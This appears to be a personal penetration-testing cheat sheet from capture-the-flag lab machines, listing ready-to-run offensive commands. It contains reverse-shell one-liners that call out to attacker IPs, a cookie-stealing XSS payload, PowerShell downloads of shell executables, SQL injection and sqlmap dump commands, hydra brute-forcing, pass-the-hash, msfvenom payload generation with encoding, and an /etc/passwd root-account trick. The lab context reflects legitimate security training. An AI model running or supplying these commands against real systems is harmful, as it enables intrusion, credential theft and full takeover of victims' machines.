#nsupdate 
dyno htb box


#PATH
echo $PATH
export PATH=/tmp:$PATH"


#SSH
scp -r CVE-2021-3156 jake@10.10.75.244:/tmp/ ------- FILE UPLOADING
ssh -L 8000:127.0.0.1:8000 roy@10.10.10.212 ---------- PORTFORWARDING
ssh jeff@jeff.thm -t "bash --noprofile
----------------------------------------------------------------------------------------------------------------------
#POWERSHELL
powershell -c "Invoke-WebRequest -Uri 'http://10.8.3.38:8081/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

Invoke-WebRequest "http://10.10.14.4/winPEAS.exe" -OutFile winpeas.exe ---- DOWNLOAD COMMAND for windows

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

----------------------------------------------------------------------------------------------------------------------
#'LFTP LOGIN' ^alternative of ftp

lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no
lftp 10.10.10.208:~> login ftpadm
----------------------------------------------------------------------------------------------------------------------

#WGET REVERSESHELL(ssti)

wget http://<your-ip>/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<your-ip>'$IFS'<port>'
----------------------------------------------------------------------------------------------------------------------
#LOG FILE MISSCONFIGURATION

;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1' #

echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/1234 0>&1' #" > hackers
----------------------------------------------------------------------------------------------------------------------

#HYDRA LOGIN FORM BRUTEFORCE


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.89.143^Cttp-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid:H=Cookie: security=low; PHPSESSID=ms2hav3kj1jdenpsvfpj7c66v4
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.87.34 http-head /  -v -- SMB authentication bypass webiste
----------------------------------------------------------------------------------------------------------------------
#SQL-MAP
##Basic tries to bypass admin pannel
username = ' or 1=1--
password = ' or 1=1--
----------------------------

sqlmap -u http://10.10.44.225/products/2 --current-db --batch
sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch
sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --dump
sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch --dump
sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch Y  --dump
sqlmap -u http://10.10.44.225/products/2 duckyinc --batch  --dump
UPDATE runcheck SET [REDACTED] = 1; - FOR CHANGING VALUE IN TABLE
sql injection -- AND 1=2 union select message_content,1,2,3 from messages where id=1 
'SQL COMMAND IN SITE'
AND 1=2 union select group_concat(column_name),1,1,1 from information_schema.columns where table_schema=database()-- 
AND 1=2 union select group_concat(table_name),1,1,1 from information_schema.tables where table_schema=database()-- 
AND 1=2 union select database(),@@version,1,1

' UNION SELECT '123' AS password# -- for sql error ' -- password=123
----------------------------------------------------------------------------------------------------------------------
#FIND COMMANDS
find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -group users -type f 2>/dev/null
find / -user jeff 2>/dev/null

find / -name "*s3cr3t*" 2>/dev/null #FIND SPECIFIC FILE USING FILE COMMAND 

----------------------------------------------------------------------------------------------------------------------
#PYTHON FOR STABLE-SHELL

python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
ENTER
ENTER
Python -c 'import os; os.setuid(0); os.system("/bin/sh")' --- PYTHON ROOT SHELL
----------------------------------------------------------------------------------------------------------------------
#LINUX CAPABILITIES

getcap -r / --- command
----------------------------------------------------------------------------------------------------------------------


#INJECTION 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &10.9.20.61 1234 >/tmp/f
<img src=x onerror=this.src="http://10.9.20.61:8000/?c="+document.cookie>
---------------------------------------------------------------------------------------------------------------------
#-WORDPRESS REVERSE SHELL METASPLOIT

msf > use exploit/unix/webapp/wp_admin_shell_upload

zip <name you save zip> php ------> plugin reverseshell

https://aptx1337.github.io/posts/thm/forbusinessreasons.html --another diff way revershell :)

if you logged as wordpress admin pannel but your not a admin ?

go and click update profile then 'add our request' like this before action=update
&ure_other_roles=administrator&


---------------------------------------------------------------------------------------------------------------
#smb-enum

smbclient //10.10.145.93/nt4wrksv

smbclient --no-pass //10.10.88.228/shares

smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash

#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash

----------------------------------------------------------------------------------------------------------------------------
#MOUNT

showmount -e 10.10.150.51
THEN
 mount -t nfs 10.10.150.51:/opt/conf conf

#MSFVENOM

sfvenom -p cmd/unix/reverse_netcat lhost=10.14.11.120 lport=9080 R --netcat rce/shell (abuse-cron)

LINUX

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.9.20.61 LPORT=9001 -f elf > reverse.elf

WINDOWS

msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php 

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=2345 -f exe -o revshell.exe //meterpreter 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.36.50 LPORT=9001 -f aspx > re.aspx
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
#rce.exe payload

#/etc/passwd abuse in writeable format

openssl passwd -1 -salt [name] [password]
username:passwordhash:0:0:root:/root:/bin/bash(format to update etc/passwd file)
